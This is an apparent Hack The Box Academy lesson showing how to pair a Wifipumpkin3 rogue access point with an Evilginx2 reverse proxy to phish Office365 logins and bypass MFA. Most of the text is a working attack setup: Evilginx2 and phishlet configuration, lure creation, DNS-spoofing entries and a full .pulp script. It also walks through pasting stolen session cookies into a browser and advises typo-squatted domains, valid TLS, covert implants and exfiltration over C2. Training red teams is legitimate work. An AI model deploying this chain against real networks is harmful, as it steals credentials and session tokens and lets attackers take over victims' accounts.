
<h1>Bypassing MFA with Evilginx2</h1>
<hr/>
<p>In this section, we explore how to use <code>Wifipumpkin3</code> in combination with <code>Evilginx2</code> to execute a <a href="https://wifipumpkin3.github.io/2024/Wifipumpkin3-evilginx2-Microsoft365-Captive-Portal-Login-Attack/">phishing attack</a> and bypass Multi-Factor Authentication (MFA). By leveraging a rogue access point and a transparent reverse proxy, we can intercept authentication flows, capture credentials, and extract valid session tokens. This technique enables an attacker to gain unauthorized access to target accounts without needing the victim’s second-factor authentication, making it a powerful approach in Wi-Fi red teaming operations.</p>
<p>We explore how leveraging a Linux host with Wifipumpkin3 and Evilginx2 provides a highly versatile, flexible, and portable solution for Wi-Fi red teaming. This setup can be deployed on a Raspberry Pi, allowing for remote execution and long-term persistence in target environments. By placing the device as a site implant inside a target building, it can operate covertly and be retrieved later. Additionally, C2 (Command and Control) capabilities can be integrated to exfiltrate captured credentials and session tokens in real time, enabling remote access to the compromised data without requiring physical retrieval.</p>
<p>This configuration allows for the most customization at all stages, with the caveat of being the most technically complex. In short, the concept involves using the following tools:</p>
<ul>
<li>
<code>Wifipumpkin3</code> - WiFi exploitation framework, creates an access point with an SSID which clients will connect to. Requires monitor-mode WLAN hardware interface.</li>
<li>
<code>Phishkin3</code> - Part of the Wifipumpkin3 framework. Serves as a proxy, redirecting all traffic from the client to the Evil Portal hosted on the Evilginx2 server, instead of its desired destination.</li>
<li>
<code>Evilginx2</code> - Hosts the Evil Portal and handles the MFA bypass mechanism.</li>
</ul>
<p>The interaction between these three elements of the attack chain can be explained with this diagram:</p>
<p><img alt="Wifipumpkin3 + Evilginx2 Operation" src="https://academy.hackthebox.com/storage/modules/291/13/S1S0.png"/></p>
<hr/>
<p>Simplification of the attack:</p>
<ol>
<li>The victim host connects to the attacker's rogue AP but is blocked from reaching the intended web page or accessing the internet.</li>
<li>The captive portal is delivered by the <code>Phishkin3</code> built-in proxy, which is part of the <code>Wifipumpkin3</code> framework. This proxy controls internet access for the victim host, ensuring that their connectivity remains restricted until the authentication flow is completed. Once the victim submits their credentials and the final redirect request is successfully sent to the attacker host at <code>http://{attacker_IP}:8080/auth/finish</code>, their access to the internet is restored.</li>
<li>After the initial connection request from the victim host reaches the <code>Phishkin3</code> proxy, it responds with an <code>HTTP 302: Redirect</code>, guiding the victim to the phishing page hosted at <code>http://{attacker_IP}:8080/verify</code>. This phishing page is served by the <code>Evilginx2</code> service running on the attacker’s host.</li>
<li>The victim host follows the redirect and requests the phishing login page from the <code>Evilginx2</code> service.</li>
<li>The attacker host delivers the phishing page hosted at <code>http://fakedomain:8080/</code>
</li>
<li>The user logs in using their credentials and completes the MFA challenge.</li>
<li>The attacker captures the victim's login credentials and MFA challenge response.</li>
<li>The attacker sends the victim an HTTP 302 redirect to <code>http://{attacker_IP}/auth/finish</code> and the <code>Phishkin3</code> proxy grants internet access permission.</li>
<li>Upon receiving access to the internet, the <code>Evilginx2</code> service redirects the victim to the legitimate website, where they retain the authentication cookies to access the legitimate resource directly.</li>
</ol>
<p>There could be an additional step where Microsoft would mark the login as suspicious and would request an additional factor of identity confirmation. If the initial MFA method is a two-digit code confirmation, the second one could be an SMS OTP, which is also captured by Evilginx2.</p>
<hr/>
<h1>Configuration</h1>
<h3>Wifipumpkin3 Configuration</h3>
<p>When the AP is created, a Python DHCP server is started. We need to ensure the gateway IP and the subnet are the same as the ones that will be configured on <code>Evilginx2</code>. First, we issue the <code>dhcpconf 1</code> command to select the configuration with ID <code>1</code>. By default, this gives us a suitable IP range class B with the gateway IP address set to <code>172.16.0.1</code>. We then issue the same command without the parameter in order to display the current configuration.</p>
<pre><code class="language-shell-session">wp3 &gt; dhcpconf 1

wp3 &gt; dhcpconf

[*] DHCP Server Option:
=======================

   Id | Class   | IP address range            | Netmask       | Router
------+---------+-----------------------------+---------------+-------------
    0 | A       | 10.0.0.20/10.0.0.50         | 255.0.0.0     | 10.0.0.1
    1 | B       | 172.16.0.100/172.16.0.150   | 255.240.0.0   | 172.16.0.1
    2 | C       | 192.168.0.100/192.168.0.150 | 255.255.255.0 | 192.168.0.1

[*] DHCP Server Settings:
=========================

 broadcast=172.16.0.255
 classtype=A
 leasetimeDef=600
 leasetimeMax=7200
 netmask=255.240.0.0
 range=172.16.0.100/172.16.0.150
 router=172.16.0.1
 subnet=172.16.0.0
</code></pre>
<p>Since the Wifipumpkin3 AP is acting as a router with DHCP and DNS services enabled, the <code>172.16.0.1</code> address will be used to configure our <code>/etc/hosts</code> file later on, as well as Evilginx2 itself, during the DNS service configuration stage. Note that the IP subnet can be customized to whatever values we prefer, and this particular subnet is only used for demonstration purposes.</p>
<p>The rest of the configuration for Wifipumpkin3 will be made using a <code>.pulp</code> configuration file after we've finalized the setup of Evilginx2, as a lot of the AP settings will be dependent on our phishing scenario.</p>
<hr/>
<h3>Evilginx2 Configuration</h3>
<p><a href="https://github.com/kgretzky/evilginx2">Evilginx2</a> is a standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies and allowing for the bypass of multi-factor authentication. Essentially, it's a custom version of <code>nginx HTTP server</code> enabling man-in-the-middle functionality to act as a proxy between a victim's browser and phished website.</p>
<p>We are aiming to use it to deploy an Office365 Outlook login for a target user with multi-factor authentication enabled on their account, and then redirect them to the official login page to avoid raising suspicion.</p>
<p>Evilginx2 can be installed with <code>apt</code> through the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt install evilginx2
</code></pre>
<hr/>
<p>If the <code>apt</code> method is not available, building it from source is very straight-forward.
Requirements for building:</p>
<ul>
<li>
<a href="https://go.dev/doc/install">Golang</a> version <code>1.18 or above</code>.</li>
<li>Optional: <a href="https://nodejs.org/en/download/">Node.js</a> version <code>14.17.0 or above</code>. You can use <a href="https://github.com/nvm-sh/nvm">nvm</a> for managing multiple Node versions on a single machine. Node.js is only required for running <code>Evilpuppet</code>, which is outside the scope of this section.</li>
</ul>
<p>Prerequisites can be installed using the following commands:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt install golang-go nodejs
</code></pre>
<p>We can install Evilginx2 using the following commands:</p>
<pre><code class="language-shell-session">[!bash!]$ git clone https://github.com/kgretzky/evilginx2
[!bash!]$ cd evilginx2
[!bash!]$ make
</code></pre>
<p>We can test for a successful installation by running the initialization commands. This will create a <code>phishlets</code> folder inside <code>build</code>, where the phishlets can be stored.</p>
<pre><code class="language-shell-session">[!bash!]$ ./evilginx2 -p phishlets
</code></pre>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> If you've installed Evilginx2 using <b>apt</b>, your phishlets directory will be located in <b>/usr/share/evilginx2/phishlets</b>. Alternatively, you will need to specify the location of the phishlets directory when launching Evilginx2 using the <b>-p {phishlets_location}</b> parameter, as seen above. Any new phishlets should always be installed in the appropriate directory, respective to your installation method. Moving forward, all commands will be based around the <b>apt</b> installation method, with the <b>/usr/share/evilginx2/phishlets</b> directory being the one used to store the phishlets.
</div>
<hr/>
<p>There are a few more parameters we need to set for the Evilginx2 server before we move forward. From the output above, we can see that it lacks a bind IPv4 address and our fake domain. The IPv4 address should be the same as the one selected in Wifipumpkin3 as the <code>router</code> address. These requirements can be set using the following commands:</p>
<pre><code class="language-shell-session">: config domain fakedomain.com
: config ipv4 external 172.16.0.1
: config ipv4 bind 172.16.0.1

: config

 domain             : fakedomain.com
 external_ipv4      : 172.16.0.1
 bind_ipv4          : 172.16.0.1
 https_port         : 443
 dns_port           : 53
 unauth_url         : 
 autocert           : on
 gophish admin_url  : 
 gophish api_key    : 
 gophish insecure   : false
</code></pre>
<p>We can also verify these configurations at any point by reading the <code>~/.evilginx2/config.json</code> file for Evilginx2 inside of its hidden home directory. Knowing how to find and work with this file allows for easy deployments at any time by simply copying the desired configuration file into the <code>~/.evilginx2/</code> directory, overwriting the outdated one.</p>
<pre><code class="language-json">{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "autocert": true,
    "bind_ipv4": "172.16.0.1",
    "dns_port": 53,
    "domain": "fakedomain.com",
    "external_ipv4": "172.16.0.1",
    "https_port": 443,
    "ipv4": "",
    "unauth_url": ""
  },
  "phishlets": {}
}
</code></pre>
<hr/>
<h3>Phishlet Configuration</h3>
<p><code>Phishlets</code> are phishing pages that can easily be set up by the attacker for use with Evilginx2. They are configured using <code>.yaml</code> files, an example of which can be seen below:</p>
<pre><code class="language-yaml">min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
sub_filters:
  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
auth_tokens:
  - domain: '.academy.breakdev.org'
    keys: ['cookie_name']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'academy.breakdev.org'
  path: '/evilginx-mastery'
</code></pre>
<p><code>Evilginx2 v3.3.0</code> does not come with any pre-installed phishlets, so we need to obtain them manually. For this demonstration, we will set up an Office365 Outlook login phishlet. An existing <code>.yaml</code> configuration file for this can be found <a href="https://raw.githubusercontent.com/An0nUD4Y/Evilginx2-Phishlets/refs/heads/master/outlook(o365).yaml">here</a>.</p>
<p>Alternatively, we can write our own phishlet based on any website we want to convert into a phishlet. Documentation on the structure and syntax of phishlet files can be found <a href="https://help.evilginx.com/community/phishlet-format">here</a>.</p>
<pre><code class="language-shell-session">[!bash!]$ cd /usr/share/evilginx2/phishlets

[!bash!]$ wget https://raw.githubusercontent.com/An0nUD4Y/Evilginx2-Phishlets/refs/heads/master/outlook(o365).yaml

[!bash!]$ mv outlook(o365).yaml o365.yaml &amp;&amp; cat o365.yaml

[..SNIP..]

proxy_hosts:

  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true}

  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}

  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false}

[..SNIP..]
</code></pre>
<p>Once the phishlet is added to the correct directory, we need to instruct Evilginx2 to make use of it. Associating it with the attacker-controlled domain will automatically prompt Evilginx2 to generate all the TLS certificates it requires to operate successfully. We will skip this step using the <code>-developer</code> parameter upon launch, since the domain <code>fakedomain.com</code> does not exist, and TLS certificates can therefore not be generated for it.</p>
<pre><code class="language-shell-session">[!bash!]$ evilginx2 -developer

[..SNIP..]

: phishlets hostname o365 fakedomain.com

[15:22:47] [inf] phishlet 'o365' hostname set to: fakedomain.com
[15:22:47] [inf] disabled phishlet 'o365'

: phishlets enable o365

: phishlets

+-----------+-----------+-------------+-----------------+-------------+
| phishlet  |  status   | visibility  |    hostname     | unauth_url  |
+-----------+-----------+-------------+-----------------+-------------+
| example   | disabled  | visible     |                 |             |
| o365      | enabled   | visible     | fakedomain.com  |             |
+-----------+-----------+-------------+-----------------+-------------+
</code></pre>
<hr/>
<h3>Lure Configuration</h3>
<p><code>Lures</code> are essentially pre-generated phishing links, which we will be sending out on our engagements. Evilginx2 provides multiple options to customize our lures. For our scenario, we will be creating <code>o365</code>, containing a <code>redirect_url</code> parameter which will redirect the user from the attacker address at <code>http://172.16.0.1/verify</code> to our phishlet at <code>https://login.fakedomain.com/{path}</code>. The <code>{path}</code> is randomly generated and serves to identify and track progress for unique users accessing the phishlet.</p>
<pre><code class="language-shell-session">: lures create o365

[16:28:32] [inf] created lure with ID: 0

: lures edit 0 redirect_url "http://172.16.0.1:8080/verify"

[21:24:13] [inf] redirect_url = 'http://172.16.0.1:8080/verify'

: lures

+-----+-----------+-----------+------------+-------------+-------------------------------+---------+------+
| id  | phishlet  | hostname  |   path     | redirector  |   redirect_url                | paused  |  og  |
+-----+-----------+-----------+------------+-------------+-------------------------------+---------+------+
| 0   | o365      |           | /vISVhLCE  |             | http://172.16.0.1:8080/verify |         | ---- |
+-----+-----------+-----------+------------+-------------+-------------------------------+---------+------+
</code></pre>
<p>Once done, we can consider the Evilginx2 configuration complete.</p>
<hr/>
<h3>DNS Service Configuration</h3>
<p>Because our evil AP will be acting as the gateway and a DNS service, we will be creating entries for the phishing domain locally, with values that are inserted into <code>/etc/hosts</code> on the attacker host. Any domain will work here, for demonstration purposes, but keep in mind the real attack should be run on an attacker-owned domain using typo-squatting to mimic a real service.</p>
<p>The subdomain entries we add for each new line are dependent on our <code>o365.yaml</code> file entries, under the <code>proxy_hosts</code> field visible in the paragraph above. All of the entries there will need to be present in our <code>/etc/hosts</code> file. The corresponding IPv4 address will always be the <code>router</code> address assigned initially on Wifipumpkin3.</p>
<pre><code class="language-shell-session">[!bash!]$ cat /etc/hosts

127.0.0.1       localhost

[..SNIP..]

# Wi-Fi Evil Twin Attacks module domain
172.16.0.1      outlook.fakedomain.com
172.16.0.1      login.fakedomain.com
172.16.0.1      account.fakedomain.com
172.16.0.1      *.fakedomain.com

[..SNIP..]
</code></pre>
<hr/>
<h3>Pulp Configuration</h3>
<p><code>Pulps</code> are automated scripts that run inside of <code>Wifipumpkin3</code> and help set it up from scratch using a singular <code>.pulp</code> file. The script syntax is simply the same as the commands we would issue manually inside of Wifipumpkin3, chained together to generate a fully programmatic environment setup experience. We can have multiple different pulps depending on the type of engagement we are preparing for, and simply instruct Wifipumpkin3 on which one to use during initialization.</p>
<p>In order for the attack cycle to be complete, we must also set up the DNS spoof attack within Wifipumpkin3, according to our DNS configuration from before, so that in the resolution process, all requests for the fake resource are linked to the address 172.16.0.1, therefore redirected to the Evilginx2 HTTP server.</p>
<p>Having configured the Evilginx2 server, we can add all of the manual Wifipumpkin3 configuration parameters to the <code>.pulp</code> file.</p>
<pre><code class="language-pulp">set interface wlan1
set ssid HTB-Corp
dhcpconf 1
set proxy phishkin3 true
set phishkin3.cloud_url_phishing https://outlook.fakedomain.com/vISVhLCE
set phishkin3.proxy_port 8080
set phishkin3.redirect_url_after_login https://outlook.live.com/mail
set phishkin3.allow_user_login_endpoint /verify
use spoof.dns_spoof
add login.fakedomain.com
add account.fakedomain.com
add outlook.fakedomain.com
add *.fakedomain.com
set redirectTo 172.16.0.1
start
back
start
</code></pre>
<ul>
<li>
<code>interface</code> - Select the WLAN interface as output in the <code>ifconfig</code> output.</li>
<li>
<code>ssid</code> - Select the preferred network AP name to be advertised to the victim.</li>
<li>
<code>phishkin3.cloud_url_phishing</code> - Input the randomly generated ID as seen in the <code>lures &gt; path</code> column in Evilginx2.</li>
<li>
<code>phishkin3.redirect_url_after_login</code> - Input the real resource the user would expecting to access after login.</li>
<li>
<code>phishkin3.allow_user_login_endpoint</code> - Input the same page name as seen in the <code>lures &gt; redirect_url</code> column in Evilginx2.</li>
<li>Make sure to add all the subdomains configured in <code>/etc/hosts</code> under the <code>spoof.dns_spoof</code> service.</li>
<li>
<code>redirectTo</code> - Select the IPv4 address configured for the <code>router</code> in Wifipumpkin3 initially.</li>
</ul>
<p>Once saved, we can apply the pulp to the Wifipumpkin3 initialization with the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo wifipumpkin3 -p evilginx_config.pulp

[..SNIP..]

[*] plugin: evilginx_config.pulp
================================


[*] DnsSpoof attack
===================

[*] Redirect to: 172.16.0.1 

[*] Targets:
============

[*] -&gt; [login.fakedomain.com] 
[*] -&gt; [account.fakedomain.com] 
[*] -&gt; [outlook.fakedomain.com] 
[*] -&gt; [*.fakedomain.com] 
[*] module: dns_spoof running in background
[*] use jobs command displays the status of jobs started
[+] enable forwarding in iptables...
[*] sharing internet connection with NAT...
[*] setting interface for sharing internet: None 
[*] settings for Phishkin3 portal:
[*] allow FORWARD UDP DNS
[*] allow traffic to Phishkin3 captive portal
[*] block all other traffic in access point
[*] redirecting HTTP traffic to captive portal
[+] starting hostpad pid: [25487]
wp3 &gt; [+] hostapd is running
[*] starting pydhcp_server
[+] starting phishkin3 pid: [25492]
[*] starting sniffkin3 port: [80, 8080]
[+] sniffkin3 -&gt; ftp        activated
[+] sniffkin3 -&gt; emails     activated
[+] sniffkin3 -&gt; httpCap    activated
[+] sniffkin3 -&gt; kerberos   activated
[+] sniffkin3 -&gt; hexdump    activated

[..SNIP..]

 * Running on http://172.16.0.1:8080
</code></pre>
<hr/>
<h1>Launching the attack</h1>
<p>This demonstration attack leverages a Wifipumpkin3 evil portal to redirect victims to an Evilginx2 phishing page mimicking an Office 365 Outlook login. While this exact scenario may not be entirely realistic, it effectively illustrates how authentication tokens are handled within the attack chain. Once the victim logs into the phishing page, their authentication is seamlessly forwarded to the legitimate Outlook web app, granting them access without requiring an additional login. This showcases the power and effectiveness of session hijacking in modern phishing attacks.</p>
<p>To prevent the use of a real phishing domain during testing, the <code>-developer</code> option is enabled in Evilginx2. This disables automatic TLS certificate generation for <code>fakedomain.com</code>, but as a result, users will encounter an untrusted website warning in their browsers. In a real-world attack, an attacker-controlled domain with a valid TLS certificate should be used, and the <code>-developer</code> option should be turned off to avoid raising suspicion. Below, we showcase both perspectives of the attack, in a step-by-step manner.</p>
<p>The order in which we start each service is crucial since <code>Evilginx2</code> has a built-in DNS service that is not needed in this setup. To prevent Evilginx2 from running its DNS service, we must start <code>Wifipumpkin3</code> first. This ensures that <code>dns_spoof</code> within Wifipumpkin3 advertises the configured DNS records for <code>fakedomain.com</code> through the rogue AP, directing victims to the phishing page without interference.</p>
<p>We begin by creating the rogue AP using <code>Wifipumpkin3</code> and the <code>.pulp</code> configuration file. This will spawn the AP, start up the DHCP and DNS spoofing services, and await connections from potential victims.</p>
<p><img alt="Wifipumpkin3 Initialization" src="https://academy.hackthebox.com/storage/modules/291/13/S13S1-new.gif"/></p>
<p>Once <code>Wifipumpkin3</code> is started, we can launch <code>Evilginx2</code>, which will spin up the redirector and the phishing page.</p>
<p><img alt="Evilginx2 Initialization" src="https://academy.hackthebox.com/storage/modules/291/13/S13S2-new.gif"/></p>
<p>Immediately after <code>Wifipumpkin3</code> is launched, the victim can see the rogue AP and connect to it successfully. During a successful attack chain, the evil portal would pop up with the crafted authentication page.</p>
<p><img alt="Victim AP Connection" src="https://academy.hackthebox.com/storage/modules/291/13/S13S3-new.gif"/></p>
<p>Once connected, they will be met with a fake Office365 login page, TLS errors aside.</p>
<p><img alt="Victim Phishing Page" src="https://academy.hackthebox.com/storage/modules/291/13/S13S5.gif"/></p>
<p>On the attacker's side, <code>Evilginx2</code> will output that a new client has appeared and has accessed the lure path.</p>
<p><img alt="Attacker Evilginx2 Connect" src="https://academy.hackthebox.com/storage/modules/291/13/S13S4.gif"/></p>
<p>The victim is convinced to input their credentials and proceed with login. At this point in time, the only lead they have on the existence of the phishing attack is the typo-squatted URL of the attacker's domain.</p>
<p><img alt="Victim Login" src="https://academy.hackthebox.com/storage/modules/291/13/S13S6.gif"/></p>
<p>In turn, <code>Evilginx2</code> will remark that they have been captured successfully, and outputs their values in the terminal.</p>
<p><img alt="Attacker Evilginx2 Login" src="https://academy.hackthebox.com/storage/modules/291/13/S13S7.gif"/></p>
<p>Due to the victim's account security settings, MFA is enforced, prompting them to verify the login on their phone. Once they confirm their identity, they are redirected to the legitimate Outlook web app, with their authentication tokens proxied through the attacker's infrastructure.</p>
<p><img alt="Victim Outlook" src="https://academy.hackthebox.com/storage/modules/291/13/S13S8.gif"/></p>
<p><code>Evilginx2</code> reports having captured the tokens from the MFA authentication. These can be used later using the <code>sessions</code> command.</p>
<p><img alt="Attacker Tokens" src="https://academy.hackthebox.com/storage/modules/291/13/S13S9.gif"/></p>
<p>The attack chain is now complete. The attacker opens a browser window locally and navigates to the legitimate Office365 Outlook web-app login page. As we can see in the screen capture, they are not authenticated yet.</p>
<p><img alt="Victim Phishing Page" src="https://academy.hackthebox.com/storage/modules/291/13/S13S10.gif"/></p>
<p>The attacker uses the <code>sessions</code> command to output the JSON values for the victim's session. This is then copied and pasted over in their browser.</p>
<p><img alt="Victim Phishing Page" src="https://academy.hackthebox.com/storage/modules/291/13/S13S11.gif"/></p>
<p>Add-ons such as <a href="https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?pli=1">CookieEditor</a> allow the attacker to remove their current cookies and paste in the JSON value taken from <code>Evilginx2</code>. Revisiting the page at its legitimate address, <code>login.live.com</code>, now authenticated the attacker using the victim's session.</p>
<p><img alt="Victim Phishing Page" src="https://academy.hackthebox.com/storage/modules/291/13/S13S12.gif"/></p>
<hr/>
<h2>Limitations</h2>
<p>This attack is not effective against accounts secured with physical authentication tokens, such as Yubikeys, because these devices establish a direct handshake with the victim’s device, making interception over the network impossible.</p>
<p>Additionally, depending on the OS patch level of the target device, issues with connection trust may arise. In such cases, the victim may see an error message stating: "This connection is untrusted," preventing communication with the Evilginx2 service.</p>
<p>Another challenge is that major companies like Microsoft and Google continuously implement mitigations to disrupt reverse proxy-based phishing attacks. A common issue is encountering a blank screen instead of the login page. These mitigations often rely on JavaScript protections and require debugging the proxy to remove them, bypassing subdomain validation checks performed by the victim's browser.</p>
<p>Ultimately, many OS-level and browser-based limitations can be mitigated by deploying a phishing infrastructure in the cloud with properly configured SSL. This approach helps avoid various connection trust issues and enhances the effectiveness of the attack.</p>
